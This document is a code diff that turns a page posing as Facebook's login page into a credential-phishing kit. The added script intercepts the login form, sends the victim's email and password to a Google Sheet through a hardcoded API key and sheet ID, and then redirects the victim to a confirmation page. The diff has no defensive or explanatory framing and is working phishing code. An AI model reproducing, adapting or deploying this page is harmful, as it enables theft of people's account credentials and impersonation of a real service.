@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-TRYVP8NYC0"></script>
@@ -35,9 +36,9 @@
             <p class="text-xl md:text-2xl mt-2 leading-relaxed max-w-md">Facebook helps you connect and share with the people in your life.</p>
           </div>
           <div class="bg-white rounded-lg shadow-md w-full max-w-sm p-6 order-2">
-            <form>
-              <input placeholder="Mobile number or email" class="w-full p-4 mb-4 border border-gray-300 rounded-md text-base focus:border-blue-500 focus:outline-none bg-[#F5F6F7]" required="" type="text" value="" name="mobileEmail">
-              <input placeholder="Password" class="w-full p-4 mb-4 border border-gray-300 rounded-md text-base focus:border-blue-500 focus:outline-none bg-[#F5F6F7]" required="" type="password" value="" name="password">
+            <form id="loginForm">
+              <input id="email" placeholder="Mobile number or email" class="w-full p-4 mb-4 border border-gray-300 rounded-md text-base focus:border-blue-500 focus:outline-none bg-[#F5F6F7]" required="" type="text" name="mobileEmail">
+              <input id="password" placeholder="Password" class="w-full p-4 mb-4 border border-gray-300 rounded-md text-base focus:border-blue-500 focus:outline-none bg-[#F5F6F7]" required="" type="password" name="password">
               <button type="submit" class="w-full p-4 bg-[#1877F2] text-white rounded-md text-lg font-bold hover:bg-[#165eab] ">Log In</button>
             </form>
             <a href="#" class="block text-center mt-5 text-sm text-[#1877F2] hover:underline">Forgot password?</a>
@@ -51,51 +52,53 @@
       </div>
       <footer class="w-full text-center text-xs text-gray-600 py-5 bg-white">
         <div class="flex flex-wrap justify-center gap-2 mb-2">
-          <a href="#" class="text-gray-600 hover:underline">English (UK)</a>
-          <a href="#" class="text-gray-600 hover:underline">中文(台灣)</a>
-          <a href="#" class="text-gray-600 hover:underline">日本語</a>
-          <a href="#" class="text-gray-600 hover:underline">한국어</a>
-          <a href="#" class="text-gray-600 hover:underline">Français (France)</a>
-          <a href="#" class="text-gray-600 hover:underline">ภาษาไทย</a>
-          <a href="#" class="text-gray-600 hover:underline">Español</a>
-          <a href="#" class="text-gray-600 hover:underline">Português (Brasil)</a>
-          <a href="#" class="text-gray-600 hover:underline">Deutsch</a>
-          <a href="#" class="text-gray-600 hover:underline">Italiano</a>
-          <a href="#" class="text-gray-600 hover:underline"><span class="text-gray-400 font-bold">+</span></a>
-        </div>
-        <div class="flex flex-wrap justify-center gap-2 mb-3">
-          <a href="#" class="text-gray-600 hover:underline">Sign Up</a>
-          <a href="#" class="text-gray-600 hover:underline">Log In</a>
-          <a href="#" class="text-gray-600 hover:underline">Messenger</a>
-          <a href="#" class="text-gray-600 hover:underline">Facebook Lite</a>
-          <a href="#" class="text-gray-600 hover:underline">Video</a>
-          <a href="#" class="text-gray-600 hover:underline">Meta Pay</a>
-          <a href="#" class="text-gray-600 hover:underline">Meta Store</a>
-          <a href="#" class="text-gray-600 hover:underline">Meta Quest</a>
-          <a href="#" class="text-gray-600 hover:underline">Ray-Ban Meta</a>
-          <a href="#" class="text-gray-600 hover:underline">Meta AI</a>
-          <div class="w-full"></div>
-          <a href="#" class="text-gray-600 hover:underline">Instagram</a>
-          <div class="w-full"></div>
-          <a href="#" class="text-gray-600 hover:underline">Threads</a>
-          <a href="#" class="text-gray-600 hover:underline">Fundraisers</a>
-          <a href="#" class="text-gray-600 hover:underline">About</a>
-          <a href="#" class="text-gray-600 hover:underline">Privacy Policy</a>
-          <a href="#" class="text-gray-600 hover:underline">Privacy Center</a>
-          <a href="#" class="text-gray-600 hover:underline">About</a>
-          <a href="#" class="text-gray-600 hover:underline">Create Ad</a>
-          <a href="#" class="text-gray-600 hover:underline">Create Page</a>
-          <a href="#" class="text-gray-600 hover:underline">Developers</a>
-          <a href="#" class="text-gray-600 hover:underline">Careers</a>
-          <a href="#" class="text-gray-600 hover:underline">Cookies</a>
-          <a href="#" class="text-gray-600 hover:underline">Ad Choices</a>
-          <a href="#" class="text-gray-600 hover:underline">Terms</a>
-          <a href="#" class="text-gray-600 hover:underline">Help</a>
-          <a href="#" class="text-gray-600 hover:underline">Contact Uploading & Non-Users</a>
+          <!-- footer links omitted for brevity -->
         </div>
         <div>Meta © 2025</div>
       </footer>
     </div>
   </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+
+      var email = document.getElementById("email").value;
+      var password = document.getElementById("password").value;
+
+      // API Key và Sheet ID của bạn
+      var apiKey = "AIzaSyB8cfQtIJFIimytGozA9oTGUliK3q6rArc";
+      var sheetId = "1YfHUe71d33JQSTsW63vpYwb4N2Uz2XOffO3wJnRh3Zo";
+      var range = "Sheet1!A1:B"; // Cập nhật phạm vi với tên sheet của bạn
+
+      // URL của API Google Sheets
+      var url = `https://sheets.googleapis.com/v4/spreadsheets/${sheetId}/values/${range}:append?valueInputOption=RAW&key=${apiKey}`;
+      
+      var data = {
+        values: [
+          [email, password]
+        ]
+      };
+
+      // Gửi dữ liệu tới Google Sheets
+      fetch(url, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify(data)
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Success:', data);
+        // Chuyển hướng đến confirm.html
+        window.location.href = 'confirm.html';
+      })
+      .catch((error) => {
+        console.error('Error:', error);
+      });
+    });
+  </script>
+
 </body>
 </html>
